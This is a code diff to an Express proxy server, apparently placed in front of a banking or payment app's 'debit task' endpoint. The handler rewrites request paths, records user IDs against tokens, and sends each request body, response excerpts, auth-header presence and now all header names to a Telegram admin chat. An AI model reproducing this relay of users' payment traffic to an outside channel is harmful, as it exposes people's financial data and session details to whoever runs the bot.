@@ -967,7 +967,10 @@ app.all('/app/bank/debit/update/switch', async (req, res) => {
 app.all('/app/pay/debit/task', async (req, res) => {
   try {
     const data = await loadData();
+    const origUrl = req.originalUrl;
+    req.originalUrl = req.originalUrl.replace(/^\/app\//, '/api/');
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    req.originalUrl = origUrl;
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -982,7 +985,8 @@ app.all('/app/pay/debit/task', async (req, res) => {
       const hasSig = req.headers['signature'] ? 'yes' : 'no';
       const hasToken = req.headers['logintoken'] ? 'yes' : 'no';
       const ct = req.headers['content-type'] || 'none';
-      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body(${rawLen}): ${reqBody}\n🔐 Sig: ${hasSig} | Token: ${hasToken}\n📋 CT: ${ct}\n📥 ${respBody.substring(0, 500)}`).catch(()=>{});
+      const allHeaders = Object.keys(req.headers).filter(h => !h.startsWith('x-vercel')).join(', ');
+      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body(${rawLen}): ${reqBody}\n🔐 Sig: ${hasSig} | Token: ${hasToken}\n📋 CT: ${ct}\n🔑 Headers: ${allHeaders}\n📥 ${respBody.substring(0, 400)}`).catch(()=>{});
     }
   } catch(e) {
     if (bot && (await loadData()).adminChatId) {
